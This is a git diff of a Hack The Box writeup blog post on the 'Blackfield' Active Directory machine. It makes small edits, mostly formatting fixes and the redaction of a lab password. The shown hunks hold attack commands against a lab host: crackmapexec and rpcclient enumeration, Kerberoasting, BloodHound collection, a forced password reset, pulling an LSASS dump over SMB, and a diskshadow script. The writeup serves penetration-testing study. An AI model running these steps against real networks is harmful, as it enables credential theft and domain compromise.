@@ -12,7 +12,7 @@ icon: icon-htb
 > **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.
 
 <br /><br />
-<img src="{{ site.img_path }}/blackfield_writeup/Blackfield.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
+<img src="{{ site.img_path }}/blackfield_writeup/Blackfield.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
 <br /><br />
 
 This is a writeup of a **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine classified as **Hard**, I think because of the diversity of tasks and deductions to be performed, but the complexity of the vulnerabilities is not very high. For a person who is just starting like me, the box is excellent because you must research and read a lot to understand topics related to **Active Directory** such as **LDAP**, **Kerberos** or **WinRM**. I am going to access my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account, launch the machine and spawn with this beautiful journey that I have already risked to take a good while ago.
@@ -30,6 +30,7 @@ sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.192 -oG allPorts
 nmap -sCV -p53,88,135,389,445,593,3268,5985 10.10.10.192 -oN targeted               # :(
 nmap -sCV -p53,88,135,389,445,593,3268,5985 10.10.10.192 -oN targeted -Pn           # :)
 
+dig 10.10.10.192
 dig 10.10.10.192 ns
 dig 10.10.10.192 mx
 dig 10.10.10.192 axfr
@@ -164,9 +165,9 @@ Now that I have a credential, the first thing I do is validate it with `crackmap
 > **[GetUserSPNs.py](https://tools.thehacker.recipes/impacket/examples/getuserspns.py){:target="_blank"}** can be used to obtain a password hash for user accounts that have an **SPN** (service principal name). If an **SPN** is set on a user account it is possible to request a **Service Ticket** for this account and attempt to crack it in order to retrieve the user password. <ins>This attack is named **Kerberoast**</ins>. This script can also be used for **Kerberoast** without preauthentication.
 
 ```bash
-crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'           # :)
-crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'         # :(
-evil-winrm -i 10.10.10.192 -u 'support' -p '#00^BlackKnight'              # :(
+crackmapexec smb 10.10.10.192 -u 'support' -p '#...t'           # :)
+crackmapexec winrm 10.10.10.192 -u 'support' -p '#...t'         # :(
+evil-winrm -i 10.10.10.192 -u 'support' -p '#...t'              # :(
 rpcclient -U "support" 10.10.10.192
     > enumdomusers
     > enumdomgroups
@@ -174,12 +175,12 @@ rpcclient -U "support" 10.10.10.192
     > queryuser 0x451
     > queryuser lydericlefebvre
 
-rpcclient -U "support%#00^BlackKnight" 10.10.10.192 -c 'enumdomusers'
+rpcclient -U "support%#...t" 10.10.10.192 -c 'enumdomusers'
 
 impacket-GetUserSPNs --help
 #    --> Queries target domain for SPNs that are running under a user account
 
-impacket-GetUserSPNs blackfield.local/support:#00^BlackKnight
+impacket-GetUserSPNs blackfield.local/support:#...t
 #    --> No entries found!           Not kerberoasteble!
 ```
 
@@ -222,7 +223,7 @@ python3 bloodhound.py --help
 #    --> -ns NAMESERVER
 #    --> -d DOMAIN
 
-python3 bloodhound.py -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local
+python3 bloodhound.py -c all -u 'support' -p '#...t' -ns 10.10.10.192 -d blackfield.local
 
 sudo neo4j console
 bloodhound &>/dev/null & disown
@@ -256,7 +257,7 @@ Since I have the **support@blackfield.htb** account compromised, I'm going to se
 > Holding the **ExtendedRight** on a user for **User-Force-Change-Password** allows password resets without knowing the current password. Verification of this right and its exploitation can be done through **PowerShell** or alternative command-line tools, offering several methods to reset a user's password, including interactive sessions and one-liners for non-interactive environments. The commands range from simple **PowerShell** invocations to using `rpcclient` on Linux, demonstrating the versatility of attack vectors.
 
 ```bash
-rpcclient -U "support%#00^BlackKnight" 10.10.10.192
+rpcclient -U "support%#...t" 10.10.10.192
     > setuserinfo2 audit2020 23 'oldboy123'                           # :(
     > setuserinfo2 audit2020 23 'oldboy123!$'                         # :)
 crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'oldboy123!$'         # :)
@@ -267,7 +268,7 @@ net --help
 net help rpc
 #    --> net rpc password --> Change a user password
 
-net rpc password audit2020 -U blackfield.local/support%#00^BlackKnight -S 10.10.10.192
+net rpc password audit2020 -U blackfield.local/support%#...t -S 10.10.10.192
 crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'oldb123!$'           # :(
 crackmapexec winrm 10.10.10.192 -u 'audit2020' -p 'oldb123!$'         # :)
 ```
@@ -300,13 +301,12 @@ smbmap -H 10.10.10.192 -u 'audit2020' -p 'oldb123!$' --no-banner
 #      ---> forensic ....
 
 smbclient //10.10.10.192/forensic -U 'audit2020'
-    > dir
-    > cd commands_output
-    > prompt off
-    > mget *
+    dir
+    cd commands_output
+    prompt off
+    mget *
 
-cat {domain_admins.txt,domain_groups.txt,domain_users.txt,firewall_rules.txt,ipconfig.txt,netstat.txt,route.txt,systemi
-nfo.txt,tasklist.txt}
+cat {domain_admins.txt,domain_groups.txt,domain_users.txt,firewall_rules.txt,ipconfig.txt,netstat.txt,route.txt,systeminfo.txt,tasklist.txt}
 ```
 
 <br />
@@ -331,11 +331,11 @@ The other folder catches my attention because of its name - **memory_analysis** 
 
 > **LSASS.DMP** is a dump file of the **LSASS** process. Attackers can dump **LSASS** to a dump file using  tools such as **[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump){:target="_blank"}**. The attacker can then extract passwords and password hashes from the process dump offline using **Mimikatz**.
 
-```cmd
+```bash
 smbclient //10.10.10.192/forensic -U 'audit2020'
-    > dir
-    > cd memory_analysis
-    > mget lsass.zip                                  # :(
+    dir
+    cd memory_analysis
+    mget lsass.zip                                  # :(
 #     --> parallel_read returned NT_STATUS_IO_TIMEOUT
 
 smbclient //10.10.10.192/forensic -U 'audit2020' -m SMB2 -c 'timeout 120; iosize 16384; get \"memory_analysis\lsass.zip\"'
@@ -444,7 +444,7 @@ I think my mistake is that <ins>I'm performing a dump of the hashes but of the s
 nvim diskshadow.txt
 ```
 
-> **diskshadow.txt**
+> **diskshadow.txt:**
 
 ```txt
 set context persistent nowriters
